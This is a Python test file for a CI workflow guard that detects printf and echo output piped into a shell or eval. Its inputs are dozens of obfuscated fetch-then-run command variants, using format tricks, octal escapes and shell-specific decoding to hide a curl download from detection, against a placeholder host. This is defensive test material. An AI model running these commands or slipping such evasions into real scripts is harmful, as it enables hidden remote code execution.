"""#2955: a printed line is read as the shell that reads it gets it.

A printer the guard cannot spell out -- a `$` in a word, a `printf` format `printed` does not read, an `echo`
option or escape two shells read two ways -- has its words weighed as ONE text, and that text begins with the
printer's first word. `echo`'s is the line, so `echo "$X; curl … | sh" | sh` was reported. A `printf`'s is its
FORMAT and an `echo -n`'s is `-n`, so the line after it read as an argument and never as a command:
`printf '%s %s\\n' curl '-fsSLo t URL' | sh` read CLEAN under every `shell:` setting while every parent shell
runs the download. So did `eval "$(echo LINE)"`: a program word that is one `$(...)` was reported with a reason
the guard may drop, its printer's words never weighed.

The second walk now weighs, beside that one text, what the printer WRITES with each word as written
(`workflow_printers._apart`): a `printf`'s format with its words in place -- joined, cut, padded, decoded -- and
an `echo`'s line without its options, its escapes decoded where its shell decodes them. Each shell family is read
on its own (`_WRITERS`: bash 5.2, bash 3.2, bash 3.2 as macOS ships it, dash), since a quote one of them decodes
hides the command after it from that one alone. And the words of the one printer a program word's `$(...)` is are
weighed too (`worded`). The main pass reads as `main` does, so the job reports wherever either reading does.

Marks are a letter a `shell:` setting -- unset, `bash`, `sh`, `bash {0}`, `sh {0}` -- R where the guard reports:
first the job's, then the main pass's. Truth, in the comments, is what eight parent shells do in two passes on the
forge (bash 5.2.21 and 3.2.57 under `-e` and `-eo pipefail`, dash 0.5.12 under `-e`, then each without `-e`):
"runs" is the download ran under all sixteen, "under bash" under the twelve bash ones (the unset, `bash` and
`bash {0}` settings), "under dash" under the four dash ones (`sh`, `sh {0}`), "fetch only" none ran it, "nothing"
none fetched.

Named limits. A line that only FETCHES reports, as `echo curl | sh` does on `main` (`TestThePrice`): the word
`${X:+…}./t.sh` printed once with its name set, and a `curl` on a line of its own. A printer inside `$(...)` or
`<(...)` is read by every family, as `main` reads one there, so a line only dash makes reports under the bash
settings too. Behind a stage that REWRITES the text (`| tr … | sh`) the printer's text is weighed as written, as
`main` weighs an `echo`'s there, whatever the stage makes of it. A line the guard can SPELL -- the `$` escaped inside double quotes -- is a program string, and two
copies of it are #2953's. A line whose command word is a one-word default (`${X:-curl} …`) waits for #2963's
rule. `builtin` in front of a printer is no wrapper to the reader, so the printer is not read at all (#2665; as
on `main`, spelled or not).

The rendering is what the shell prints, to the character, or it is not followed and the printer reports. Followed:
text and escapes in the format, `%%`, `%s`, `%b`, `%c`, `%q`, `%d` `%i` `%u` of a plain number, a `-`, a width, a
number's `0`, a precision on `%s`, a `*` that takes a plain number, a `$` word as it stands. Not followed: every
other flag, letter, number, width and precision, where the shells print their own ways (`%.b` is the whole word to
bash 3.2 and nothing to 5.2) or the text is not one this reads -- and a text past 4,096 characters and four times
what was written, since `printf` prints its format again while words are left (`TestThePrice` for both).

A printer is read on the routes `main` reads its SPELLED twin on. On 11 of the 19 routes the eighth hunt took,
`main` reads neither -- a printer's text written to a file that is then run, kept in a variable, printed by a
group or a function, handed to `xargs` -- and those stay as they are: not this class, and sent to the coordinator.

Everything here is measured on 932 rows in nine bounded hunts; a class named below is the rows pinned for it.
"""
import unittest
from unittest import mock

import shell_reader
import workflow_guard as wg
import workflow_options as wo
import workflow_printers as wp

SHELLS = (None, "bash", "sh", "bash {0}", "sh {0}")
U = "https://example.test/t"
B, N = chr(92), chr(92) + "n"
L = "curl -fsSLo t " + U                # the fetch; `sh t` on the next line of the step runs the file
NOW = ("RRRRR", "CCCCC")                # the job reports; the main pass reads it CLEAN, as `main` did
BASH = ("RRCRC", "CCCCC")               # ... under the bash settings alone
DASH = ("CCRCR", "CCCCC")               # ... under the dash settings alone
BEFORE = ("RRRRR", "RRRRR")             # `main` reported it already
CLEAN = ("CCCCC", "CCCCC")
# A two-halved word: where X is set it fetches the file, where X is not it leaves the file's run.
WORD = "${X:+curl -fsSLo t.sh %s.sh#}./t.sh" % U
SET = "printf '' > t.sh\nchmod +x t.sh\nX=1\nexport X\n"
PRINTERS = {
    "printf '%s\\n'": "printf '%s\\n' {q}",
    "printf '%s'": "printf '%s' {q}",
    'printf "%s\\n"': 'printf "%s\\n" {q}',
    "printf '%b\\n'": "printf '%b\\n' {q}",
    "printf -- '%s\\n'": "printf -- '%s\\n' {q}",
    "printf, a second argument": "printf '%s\\n' 'true' {q}",
    "printf, after text in the format": "printf 'true\\n%s\\n' {q}",
    "printf, the line as the format": "printf {q}",
    "echo": "echo {q}",
    "echo -n": "echo -n {q}",
    "echo -E": "echo -E {q}",
    "echo, a second word": "echo 'true;' {q}",
}
ROUTES = {
    "| bash": "{p} | bash", "| dash": "{p} | dash", "| sh -s": "{p} | sh -s", "| bash -s --": "{p} | bash -s --",
    "| sudo sh": "{p} | sudo sh", "| env sh": "{p} | env sh", "| cat | sh": "{p} | cat | sh",
    "| tee f.txt | sh": "{p} | tee f.txt | sh",
    'eval "$(…)"': 'eval "$({p})"', "eval $(…)": "eval $({p})",
    'sh -c "$(…)"': 'sh -c "$({p})"', 'bash -c "$(…)"': 'bash -c "$({p})"',
    "sh <(…)": "sh <({p})",                                 # dash refuses `<(…)`: under bash
    "source <(…)": "source <({p})",                         # and bash 3.2 sources nothing from one: under bash 5.2
}
# What `main` reported already: its one text is the line where `echo` prints it down a pipe, or to a file.
MAINS = {"printf, the line as the format", "echo", "echo, a second word"}
MAINS_ECHO_ROUTES = {"| bash", "| dash", "| sh -s", "| bash -s --", "| sudo sh", "| env sh", "| cat | sh",
                     "| tee f.txt | sh", "sh <(…)", "source <(…)"}
THROUGH = {"pipe": "{p} | sh", "eval": 'eval "$({p})"', "sh -c": 'sh -c "$({p})"', "file": "sh <({p})"}


def marks(text):
    """(the job's marks, the main pass's) for a job of one step whose `run:` is `text`, both from the ONE
    `job_defects` run a setting: its first `_job_defects` pass is the main pass."""
    real, job, mains = wg._job_defects, "", ""
    for shell in SHELLS:
        seen = []

        def each(*args, **kwargs):
            seen.append(real(*args, **kwargs))
            return seen[-1]
        with mock.patch.object(wg, "_job_defects", each):
            job += "R" if wg.job_defects([wg.Step("step", text + "\necho done", shell)]) else "C"
        mains += "R" if seen[0] else "C"
    return job, mains


def fed(printer, route="pipe"):
    """`printer` handed to a shell down `route`, then the file `t` run."""
    return THROUGH[route].format(p=printer) + "\nsh t"


def single(printer, route="{p} | sh", quoted="'%s'" % WORD):
    """The word printed once, its name set: it only fetches."""
    return SET + route.format(p=printer.format(q=quoted))


def pair(printer, route="{p} | sh", quoted="'%s'" % WORD):
    """The word printed twice, its name set for the first copy and unset for the second: fetched, then run."""
    one = route.format(p=printer.format(q=quoted))
    return SET + one + "\nunset X\n" + one


class TestThePairReports(unittest.TestCase):
    """The issue's PF-w-pair and EVS-pair through the first hunt's 12 printers, 14 routes and 4 quotings: 46 rows,
    each run by a parent."""

    def test_through_the_twelve_printers(self):                   # truth: runs; `echo -E` under bash, dash prints the `-E`
        for name, printer in PRINTERS.items():
            with self.subTest(printer=name):
                self.assertEqual(BEFORE if name in MAINS else BASH if name == "echo -E" else NOW, marks(pair(printer)))

    def test_through_the_fourteen_routes(self):                     # truth: runs
        for name, route in ROUTES.items():
            with self.subTest(route=name, printer="printf"):
                self.assertEqual(NOW, marks(pair(PRINTERS["printf '%s\\n'"], route)))
            with self.subTest(route=name, printer="echo"):
                self.assertEqual(BEFORE if name in MAINS_ECHO_ROUTES else NOW, marks(pair(PRINTERS["echo"], route)))

    def test_however_the_line_is_quoted(self):
        bare = WORD.replace("$", "\\$").replace(" ", "\\ ").replace("#", "\\#")
        for printer, was in ((PRINTERS["printf '%s\\n'"], NOW), (PRINTERS["echo"], BEFORE)):
            with self.subTest(quoted="each character escaped", printer=printer[:6]):       # runs
                self.assertEqual(was, marks(pair(printer, quoted=bare)))
            with self.subTest(quoted="$'…'", printer=printer[:6]):                          # under bash
                self.assertEqual(was, marks(pair(printer, quoted="$'%s'" % WORD)))

    def test_a_line_the_guard_can_spell_is_a_program_string_and_two_copies_are_2953s(self):
        # The `$` escaped inside double quotes: `printed` spells the line, so it is read as a `-c` string is. Two
        # identical strings at two places are one word to the reader (#2953), and the pair reads CLEAN: runs.
        spelled = '"%s"' % WORD.replace("$", "\\$")
        for printer in (PRINTERS["printf '%s\\n'"], PRINTERS["echo"]):
            with self.subTest(printer=printer[:6]):
                self.assertEqual(CLEAN, marks(pair(printer, quoted=spelled)))


class TestALineTheFormatPutsTogether(unittest.TestCase):
    """27 printers whose FORMAT puts the line together. 25 hold no `$` at all: the format alone made them
    unspelled. `main` read the first table's 24 CLEAN down a pipe, and reported the second's three there."""

    JOINED = {                                              # truth: runs, each of them
        "two words, one line": "printf '%s %s" + N + "' curl '-fsSLo t " + U + "'",
        "four words": "printf '%s %s %s %s" + N + "' curl -fsSLo t " + U,
        "the command word in two halves": "printf '%s%s" + N + "' cur 'l -fsSLo t " + U + "'",
        "the format used again a word": "printf '%s ' curl -fsSLo t " + U,
        "after `--`": "printf -- '%s %s" + N + "' curl '-fsSLo t " + U + "'",
        "a `$` in a word": "printf '%s %s" + N + "' curl \"-fsSLo t " + U + "$Q\"",
        "the command in the format": "printf 'c%s -fsSLo t " + U + N + "' url",
        "a conversion past the words": "printf '%s" + L + N + "'",
        "after `%%`": "printf '%%s" + N + "%s" + N + "' '" + L + "'",
        "after a line of the format": "printf 'true" + N + "curl -fsSLo t %s" + N + "' " + U,
        "an octal escape in the format": "printf '" + B + "143url -fsSLo t %s" + N + "' " + U,
        "two `%b` words": "printf '%b' '" + L + N + "' 'true" + N + "'",
        "a `%b` word that decodes to two lines": "printf '%b" + N + "' \"true" + N + L + "$Q\"",
        "an octal escape in a `%b` word": "printf '%b" + N + "' '" + B + "143url -fsSLo t " + U + "'",
        "`\\c` ending a `%b` word": "printf '%b' '" + L + N + B + "c' 'echo \"open'",
        "a precision past the word": "printf '%.99s" + N + "' '" + L + "'",
        "a precision that cuts a word to the command": "printf '%.4s -fsSLo t %s" + N + "' curling " + U,
        "a width that pads the command's space": "printf '%-5s-fsSLo t %s" + N + "' curl " + U,
        "a width that pads on the left": "printf 'curl%13s t %s" + N + "' -fsSLo " + U,
        "a precision and a width": "printf '%-5.4s-fsSLo t %s" + N + "' curling " + U,
        "four `%c`": "printf '%c%c%c%c -fsSLo t %s" + N + "' cat uname rm ls " + U,
        "`/usr/bin/printf`": "/usr/bin/printf '%s %s" + N + "' curl '-fsSLo t " + U + "'",
        "`command printf`": "command printf '%s %s" + N + "' curl '-fsSLo t " + U + "'",
        "`env printf`": "env printf '%s %s" + N + "' curl '-fsSLo t " + U + "'",
    }
    MAINS_READ = {                                          # `main`'s one text happens to begin with the fetch
        "the fetch in the format": "printf 'curl %s %s %s" + N + "' -fsSLo t " + U,          # runs
        "a `*` width": "printf '%*s" + N + "' 1 '" + L + "'",                                # runs
        "a `%n` after the line": "printf 'curl -fsSLo t %s%n" + N + "' " + U + " v",         # runs
    }

    def test_down_a_pipe(self):
        for name, printer in self.JOINED.items():
            with self.subTest(printer=name):
                self.assertEqual(NOW, marks(fed(printer)))
        for name, printer in self.MAINS_READ.items():
            with self.subTest(printer=name):
                self.assertEqual(BEFORE, marks(fed(printer)))

    def test_through_a_substitution_where_main_weighed_no_printer_at_all(self):
        for name in ("two words, one line", "the command word in two halves", "the command in the format"):
            for route in ("eval", "sh -c", "file"):          # truth: runs; the file route under bash
                with self.subTest(printer=name, route=route):
                    self.assertEqual(NOW, marks(fed(self.JOINED[name], route)))
        for name in ("a width that pads the command's space", "a precision that cuts a word to the command", "four `%c`"):
            with self.subTest(printer=name, route="eval"):   # truth: runs
                self.assertEqual(NOW, marks(fed(self.JOINED[name], "eval")))
        for name, printer in self.MAINS_READ.items():        # ... nor these, down a pipe its one text's
            with self.subTest(printer=name):
                self.assertEqual(NOW, marks(fed(printer, "eval")))

    def test_the_second_use_of_the_format_bares_a_fetch_the_first_kept_in_a_quote(self):
        # The format opens a quote and never closes it. Used once, the fetch is inside it; used again for a
        # second word, its own `"` closes the quote and the fetch stands bare.
        twice = "printf 'echo \"" + N + L + " #%s" + N + "' w1 w2"
        for route in ("pipe", "eval"):
            with self.subTest(route=route):
                self.assertEqual(NOW, marks(fed(twice, route)))                              # truth: runs
                self.assertEqual(CLEAN, marks(fed(twice[:-3], route)))                       # one word: nothing

    FILTERED = ("printf '%s %s" + N + "' curl '-fsSLo t " + U + "'", "printf '%s" + N + "' \"" + L + "$Q\"",
                'echo -n "' + L + '$Q"')

    def test_behind_a_stage_that_hands_the_line_on_as_it_is(self):
        # `main` weighs the printer's text where a stage between it and the shell rewrites the stream: there too
        # an unspelled printer's was its words as one.  Truth: runs, each of the twelve.
        for printer in self.FILTERED:
            for stage in ("tr x x", "grep .", "sed 's/^//'", "sort"):
                with self.subTest(printer=printer[:8], stage=stage):
                    self.assertEqual(NOW, marks("%s | %s | sh\nsh t" % (printer, stage)))
        self.assertEqual(BEFORE, marks('echo "' + L + '$Q" | tr x x | sh\nsh t'))          # `echo`'s text is its line

    def test_on_eight_routes_main_reads_the_spelled_twin_on(self):
        printf, echo = self.JOINED["two words, one line"], "echo '" + L + "'"
        for name, route, was in (("sh /dev/stdin", "{p} | sh /dev/stdin", NOW), ("sh -", "{p} | sh -", NOW),      # runs
                                 ("bash -s", "{p} | bash -s", NOW), ("a subshell", "( {p} ) | sh", NOW),           # runs
                                 ("after `&&`", "true && {p} | sh", NOW), ("backticks", 'eval "`{p}`"', NOW),      # runs
                                 ("a here-string", 'sh <<< "$({p})"', BEFORE),                          # under bash
                                 ("a heredoc", "sh <<EOF\n$({p})\nEOF", BEFORE)):                        # runs
            with self.subTest(route=name):
                self.assertEqual(was, marks(route.format(p=printf) + "\nsh t"))
                self.assertEqual(BEFORE, marks(route.format(p=echo) + "\nsh t"))

    def test_the_format_in_a_variable_has_each_word_weighed(self):
        step = "F='%s" + N + "'\n" + "{}\nsh t"             # truth: runs
        self.assertEqual(BEFORE, marks(step.format("printf \"$F\" '" + L + "' | sh")))
        self.assertEqual(NOW, marks(step.format("eval \"$(printf \"$F\" '" + L + "')\"")))


class TestOneShellsOwnReading(unittest.TestCase):
    """What only one family of shells prints as a line: read under the settings that family is, and no other."""

    def test_fourteen_lines_only_bash_prints(self):         # truth: under bash, each
        for name, printer in (
                ("`\\x` in a format", "printf '" + B + "x63url -fsSLo t %s" + N + "' " + U),
                ("`%q`", "printf '%q ' curl -fsSLo t " + U),
                ("`%Q`, bash 5.2's", "printf '%Q ' curl -fsSLo t " + U),                    # under bash 5.2
                ("`%(text)T`, bash 5.2's", "printf '%(" + L + ")T" + N + "' 0"),            # under bash 5.2
                ("a length letter", "printf '%ls %ls" + N + "' curl '-fsSLo t " + U + "'"),
                ("`\\u`, bash 5.2's", "printf '" + B + "u0063url -fsSLo t %s" + N + "' " + U),   # under bash 5.2
                ("a `\\\"` that closes a quote", "printf '\"true " + B + "\"; " + L + " #\"" + N + "'"),
                ("a `\\u0022` bash 3.2 leaves", "printf '" + B + "u0022; " + B + "x63url -fsSLo t " + U + " #"
                 + B + "u0022" + N + "'"),                                                  # under bash 3.2
                ("echo -ne", 'echo -ne "' + L + "$Q" + N + '"'),
                ("echo -e, an octal escape", 'echo -e "' + B + "0143url -fsSLo t " + U + '$Q"'),
                ("echo -e, `\\x`", 'echo -e "' + B + "x63url -fsSLo t " + U + '$Q"'),
                ("echo -e, `\\c`", 'echo -e "' + L + "$Q" + B + 'c" junk'),
                ("echo -e, tabs", 'echo -e "curl' + B + "t-fsSLo" + B + "tt" + B + "t" + U + '$Q"'),
                ("echo -e, `\\c` before an open quote", 'echo -e "' + L + "$Q" + N + B + "c\" 'echo \"open'")):
            with self.subTest(printer=name):
                self.assertEqual(BASH, marks(fed(printer)))

    def test_the_readings_are_not_nested(self):
        # One text a family, never "whatever any shell decodes": a quote one family decodes hides the command
        # from that family and bares it to the other. Each row has a conversion in front of the line, so `main`'s
        # one text does not begin with it.
        for name, printer, written in (
                # bash decodes `\"`: the quote closes and the fetch stands bare. dash keeps it open.  Under bash.
                ("bash alone bares it", "printf '\"%s " + B + "\"; %s #\"" + N + "' true '" + L + "'", BASH),
                # dash keeps `\"` two characters: no quote, so the fetch is a command. bash quotes it.  Under dash.
                ("dash alone bares it", "printf '%s " + B + "\"a; %s; echo b" + B + "\"" + N + "' echo '" + L + "'", DASH),
                # bash 5.2 decodes `\u0022` into a quote; bash 3.2 and dash keep it.  Under bash 3.2 and dash.
                ("bash 5.2 alone hides it", "printf '" + B + "u0022; %s #" + B + "u0022" + N + "' '" + L + "'", NOW)):
            with self.subTest(row=name):
                self.assertEqual(written, marks(fed(printer)))

    def test_three_lines_only_dash_prints(self):            # truth: under dash, each
        for name, printer in (
                ("echo, `\\n` with no option", 'echo "true' + N + L + '$Q"'),
                ("echo -E, which dash prints", 'echo -E "true' + N + L + '$Q"'),
                ("echo, an octal escape with no `0`", 'echo "' + B + "143url -fsSLo t " + U + '$Q"')):
            with self.subTest(printer=name):
                self.assertEqual(DASH, marks(fed(printer)))
        # A spelled twin `main` reads the same way, setting by setting.
        self.assertEqual(("CCRCR", "CCRCR"), marks(fed("echo 'true" + N + L + "'")))

    def test_three_lines_both_print(self):                  # truth: runs, each
        for name, printer in (
                ("echo -e, `\\n`", 'echo -e "true' + N + L + '$Q"'),
                ("echo -en", 'echo -en "true' + N + L + "$Q" + N + '"'),
                ("echo -e -n", 'echo -e -n "true' + N + L + "$Q" + N + '"')):
            with self.subTest(printer=name):
                self.assertEqual(NOW, marks(fed(printer)))
        self.assertEqual(BEFORE, marks(fed("echo -e 'true" + N + L + "'")))                  # spelled: `main`'s

    def test_sixteen_printers_that_print_no_line_stay_clean(self):  # truth: nothing, each
        for name, printer in (
                ("`%d`", "printf '%d" + N + "' '" + L + "'"),
                ("`%c`", "printf '%c" + N + "' '" + L + "'"),
                ("a precision that cuts the command", "printf '%.3s" + N + "' '" + L + "'"),
                ("`%.s`", "printf '%.s -fsSLo t %s" + N + "' curl " + U),
                ("three `%c`", "printf '%c%c%c -fsSLo t %s" + N + "' cat uname rm " + U),
                ("no width, no space", "printf '%s-fsSLo t %s" + N + "' curl " + U),
                ("a width the word fills", "printf '%-4s-fsSLo t %s" + N + "' curl " + U),
                ("the line after a word of the format", "printf 'true %s" + N + "' '" + L + "'"),
                ("the line in a comment", "printf '# %s" + N + "' '" + L + "'"),
                ("the line in quotes", "printf \"'%s'" + N + "\" '" + L + "'"),
                ("the line an `echo`'s", "printf 'echo %s" + N + "' '" + L + "'"),
                ("`-v NAME`", "printf -v out '%s" + N + "' '" + L + "'"),
                ("a letter no shell knows, first", "printf '%y" + N + "curl -fsSLo t %s" + N + "' x " + U),
                ("echo, the line a second word", 'echo true "' + L + '$Q"'),
                ("echo -e, the line a second word", 'echo -e "true ' + L + '$Q"'),
                ("echo -e, an octal escape with no `0`", 'echo -e "' + B + "143url -fsSLo t " + U + '$Q"')):
            for route in ("pipe", "eval"):
                with self.subTest(printer=name, route=route):
                    self.assertEqual(CLEAN, marks(fed(printer, route)))

    def test_a_percent_that_begins_no_conversion_ends_the_output(self):
        after, before = "printf '" + L + N + "%'", "printf '%" + N + L + N + "'"
        self.assertEqual(BEFORE, marks(fed(after)))                      # truth: runs; the line is printed first
        self.assertEqual(NOW, marks(fed(after, "eval")))                 # runs
        for route in ("pipe", "eval"):                                   # truth: nothing; no shell prints the line
            with self.subTest(route=route):
                self.assertEqual(CLEAN, marks(fed(before, route)))
                self.assertEqual(CLEAN, marks(fed("printf '%" + N + "%s" + N + "' '" + L + "'", route)))

    def test_a_format_that_is_not_followed_reports_where_a_shell_prints_the_fetch(self):
        # What the shells print for these the rendering does not follow: they differ among themselves, or the
        # text is not one it reads. So the printer is one the guard does not follow, and the step reports.
        number = "printf 'curl -fsSLo t%d %s" + N + "sh t16" + N + "' 0x10 " + U     # truth: runs; `0x10` is 16
        self.assertEqual(BEFORE, marks(fed(number)))
        self.assertEqual(NOW, marks(fed(number, "eval")))
        for inner in (L + " %%", L + "#%Y"):                             # truth: under bash 5.2, whose `%(…)T` it is
            with self.subTest(inner=inner[-3:]):
                self.assertEqual(BASH, marks(fed("printf '%(" + inner + ")T" + N + "' 0")))
        for name, printer, piped in (
                ("`%.4q` cuts the word", "printf '%.4q -fsSLo t %s" + N + "' curlXYZ " + U, BASH),      # under bash
                ("`%n` prints nothing", "printf '%n%s" + N + "' v '" + L + "'", BASH),                   # under bash
                ("`%.-1b`", "printf '%.-1b" + N + "' '" + L + "'", NOW),                                 # under bash 3.2
                ("`%.b`", "printf '%.b" + N + "' '" + L + "'", NOW)):                                    # under bash 3.2
            with self.subTest(printer=name):
                self.assertEqual(piped, marks(fed(printer)))
                self.assertEqual(NOW, marks(fed(printer, "eval")))

    def test_an_octal_escape_past_377_is_a_byte(self):
        # `\543` is `\143`, a `c`, to every shell that reads the escape: all four in a format and in a `%b` word,
        # bash under `echo -e` (with its `0`), dash under a plain `echo`.
        tail = "url -fsSLo t " + U
        for name, printer, piped in (
                ("a format", "printf '" + B + "543" + tail + N + "'", NOW),                                   # runs
                ("a format, the URL a word", "printf '" + B + "543url -fsSLo t %s" + N + "' " + U, NOW),     # runs
                ("a `%b` word", "printf '%b" + N + "' '" + B + "543" + tail + "'", NOW),                       # runs
                ("a `%b` word, a `0` in front", "printf '%b" + N + "' '" + B + "0543" + tail + "'", NOW),     # runs
                ("echo -e", 'echo -e "' + B + "0543" + tail + '$Q"', BASH),                                    # under bash
                ("echo", 'echo "' + B + "543" + tail + '$Q"', DASH),                                           # under dash
                ("echo, a `0` in front", 'echo "' + B + "0543" + tail + '$Q"', DASH)):                         # under dash
            with self.subTest(printer=name):
                self.assertEqual(piped, marks(fed(printer)))
                self.assertEqual(NOW, marks(fed(printer, "eval")))
        for route in ("pipe", "eval"):                                   # truth: nothing; `\777` is one byte, no name
            self.assertEqual(CLEAN, marks(fed("printf '" + B + "777 %s" + N + "' x", route)))

    def test_a_number_and_a_dollar_word_the_rendering_follows(self):
        # A number as written, zeros where its `0` asks, `0` for a word that begins none; a `$` word as it stands.
        for route in ("pipe", "eval"):                                   # truth: nothing, each
            for printer in ("printf 'echo %03d" + N + "' 7", "printf 'echo %d %i %u" + N + "' x y",
                            "printf '%q -fsSLo t %s" + N + "' \"$X\" " + U,
                            "printf 'echo %d %s" + N + "' \"$X\" \"$Y\""):
                with self.subTest(printer=printer[8:24], route=route):
                    self.assertEqual(CLEAN, marks(fed(printer, route)))
            self.assertEqual(CLEAN, marks(THROUGH[route].format(p="printf 'export BUILD=%05d" + N + "' \"$n\"")))
        zeros = "printf 'curl -fsSLo t%03d %s" + N + "sh t007" + N + "' 7 " + U      # truth: runs; the file is `t007`
        self.assertEqual(BEFORE, marks(THROUGH["pipe"].format(p=zeros)))
        self.assertEqual(NOW, marks(THROUGH["eval"].format(p=zeros)))

    def test_a_bare_variable_or_a_harmless_default_through_the_twelve_printers(self):
        for line in ("$X -fsSLo t " + U, "${X:-echo} -fsSLo t " + U):                       # truth: nothing
            for name, printer in PRINTERS.items():
                with self.subTest(line=line[:10], printer=name):
                    self.assertEqual(CLEAN, marks(printer.format(q="'%s'" % line) + " | sh\nsh t"))


class TestThePrice(unittest.TestCase):
    """What reports though no parent runs a download: a line that only FETCHES, as on `main`; a line only dash
    makes, on a route every family is read for; and a printer the guard does not follow."""

    def test_the_single_through_the_twelve_printers(self):        # truth: fetch only
        for name, printer in PRINTERS.items():
            with self.subTest(printer=name):
                self.assertEqual(BEFORE if name in MAINS else BASH if name == "echo -E" else NOW,
                                 marks(single(printer)))

    def test_the_single_a_guard_can_spell_stays_clean(self):
        spelled = '"%s"' % WORD.replace("$", "\\$")         # truth: fetch only
        for printer in (PRINTERS["printf '%s\\n'"], PRINTERS["echo"]):
            with self.subTest(printer=printer[:6]):
                self.assertEqual(CLEAN, marks(single(printer, quoted=spelled)))

    def test_a_fetcher_on_a_line_of_its_own_is_its_spelled_twin(self):
        self.assertEqual(BEFORE, marks("echo curl | sh\nsh t"))                              # `main`'s reading
        self.assertEqual(NOW, marks(fed("printf '%s" + N + "' curl -fsSLo t " + U)))        # truth: fetch only

    def test_a_format_printed_again_past_the_bound_is_not_followed_and_reports(self):
        long = "printf '" + ("true" + N) * 100 + "%s" + N + "' "       # 100 lines of `true`, then the word's
        for route in ("pipe", "eval"):
            with self.subTest(route=route):
                self.assertEqual(NOW, marks(fed(long + "w " * 40, route)))               # truth: nothing -- the price
                self.assertEqual(CLEAN, marks(fed(long + "w w w", route)))               # within it: nothing, and read
                self.assertEqual(NOW, marks(fed(long + "true " * 39 + "'" + L + "'", route)))   # truth: runs
                self.assertEqual(NOW, marks(fed(long + "true true '" + L + "'", route)))        # within it: runs
                self.assertEqual(NOW, marks(fed("printf '" + "%250s" * 40 + N + "' w", route)))     # nothing: 10,000 blanks

    def test_a_format_that_is_not_followed_reports_whatever_it_prints(self):
        # Truth: nothing, each -- the line is harmless. The guard does not follow the format, so it cannot say so.
        for name, printer, piped in (
                ("`%x`", "printf 'echo %x" + N + "' 255", NOW), ("`%.1f`", "printf 'echo %.1f" + N + "' 1", NOW),
                ("`%+d`", "printf 'echo %+d" + N + "' 5", NOW), ("`%5b`", "printf 'echo %5b" + N + "' ab", NOW),
                ("`%.2q`", "printf 'echo %.2q" + N + "' abc", BASH),
                ("a `*` of `08`", "printf 'echo %*s" + N + "' 08 ab", NOW),
                ("a `$` word padded", "printf 'echo %5s" + N + "' \"$HOME\"", NOW),
                ("a `$` word under `%c`", "printf 'echo %c" + N + "' \"$HOME\"", NOW),
                ("`%q` of a `~`", "printf 'echo %q" + N + "' '~x'", BASH),
                ("`%(%Y)T`", "printf 'echo %(%Y)T" + N + "' 0", BASH), ("`%n`", "printf 'echo a%nb" + N + "' v", BASH),
                ("`%d` of `0x10`", "printf 'echo %d" + N + "' 0x10", NOW)):
            with self.subTest(printer=name):
                self.assertEqual(piped, marks(fed(printer)))             # dash prints no more at a letter it
                self.assertEqual(NOW, marks(fed(printer, "eval")))       # does not know: CLEAN under `sh` down a pipe
        table = "printf '%-10s %s" + N + "' \"$A\" \"$B\""              # a table of two `$` words, padded
        for route in ("pipe", "eval"):
            self.assertEqual(NOW, marks(THROUGH[route].format(p=table)))

    def test_behind_a_stage_that_spoils_the_line_the_text_is_weighed_as_written(self):
        # `tr a-z A-Z`, a `#` put in front, `rev`: no parent runs anything.  `main` reports the `echo` spelling of
        # each (the text is weighed whatever the stage does to it), and the others now read as that one does.
        for stage in ("tr a-z A-Z", "sed 's/^/# /'", "rev"):
            for printer in TestALineTheFormatPutsTogether.FILTERED:
                with self.subTest(printer=printer[:8], stage=stage):
                    self.assertEqual(NOW, marks("%s | %s | sh\nsh t" % (printer, stage)))
            self.assertEqual(BEFORE, marks('echo "' + L + '$Q" | %s | sh\nsh t' % stage))

    def test_four_rows_only_dash_makes_report_under_the_bash_settings_too(self):
        for printer, route in (('echo "true' + N + L + '$Q"', "file"),                      # truth: nothing, each:
                               ('echo -E "true' + N + L + '$Q"', "sh -c"),                  # dash refuses `<(…)`, and
                               ('echo -E "true' + N + L + '$Q"', "file"),                   # `sh -c` takes `-E …` for
                               ('echo "' + B + "143url -fsSLo t " + U + '$Q"', "file")):   # its options
            with self.subTest(printer=printer[:12], route=route):
                self.assertEqual(NOW, marks(fed(printer, route)))


class TestTheRowsThatWaitForAnotherRule(unittest.TestCase):
    """Rows a parent runs that this PR does not move, each pinned as it reads and named with what it waits for."""

    def test_a_printed_line_whose_command_word_is_a_default_waits_for_2963(self):
        line = "${X:-curl} -fsSLo t " + U
        for name, step in (("PF-fetch-run", "printf '%%s\\n' '%s' | sh\nsh t" % line),          # runs
                           ("its `echo` twin", "echo '%s' | sh\nsh t" % line),                   # runs
                           ("EVS-fetch-run", "eval \"$(echo '%s')\"\nsh t" % line)):             # runs
            with self.subTest(row=name):
                self.assertEqual(CLEAN, marks(step))
        self.assertEqual(BEFORE, marks("eval \"$(echo '%s')\"\nsh t" % L))                       # the command written out

    def test_builtin_in_front_of_a_printer_is_no_wrapper_to_the_reader_2665(self):
        # Truth: 12 of the 16 runs, the bash parents'; dash has no `builtin`. The reader strips `command`, not
        # `builtin` (#2665), so the stage is no printer to this module, spelled (`echo 'LINE'`) or not; nothing
        # here can read it. Pinned as it reads, with #2665 named.
        for printer in ("builtin echo '" + L + "'", "builtin printf '%s %s" + N + "' curl '-fsSLo t " + U + "'"):
            with self.subTest(printer=printer[:14]):
                self.assertEqual(CLEAN, marks(fed(printer)))
        self.assertEqual(BEFORE, marks(fed("command echo '" + L + "'")))


class TestWhatAPrinterWrites(unittest.TestCase):
    """`_formatted` and `_echoed` against what the shells themselves print for the same words (measured by handing
    the words to each builtin as arguments, `render_diff.py`: bash 5.2.21, bash 3.2.57, dash 0.5.12).

    Texts are compared through `ascii()`, which is one-to-one: a rendering that kept a lone surrogate would be
    printed raw by a failing `assertEqual`, and under pytest-xdist that ends the run instead of failing the test."""

    def setUp(self):
        self.BASH5, self.BASH3, self.MACOS = wp._WRITERS["bash"]
        (self.DASH,) = wp._WRITERS["sh"]

    def test_a_format_all_three_print_alike(self):
        for fmt, words, written in (
                ("%s" + N, ["a b"], "a b\n"), ("%s %s" + N, ["a", "b c"], "a b c\n"), ("%s%s" + N, ["a", "b"], "ab\n"),
                ("%s ", ["a", "b", "c"], "a b c "), ("%s" + N, ["a", "b"], "a\nb\n"), ("x%sy", [], "xy"),
                ("%%s" + N + "%s", ["a"], "%s\na"), ("a" + N + "b %s" + N, ["c"], "a\nb c\n"),
                (B + "143x" + B + "0143 %s", ["a"], "cx\x0c3 a"), ("a" + B + "tb" + B + B + "c" + B + "qd", [], "a\tb\\c\\qd"),
                ("%b", ["a" + N, "b" + B + "0143"], "a\nbc"), ("%b" + N, [B + "143"], "c\n"), ("%s|%b|%s", ["a", "b" + B + "c", "d"], "a|b"),
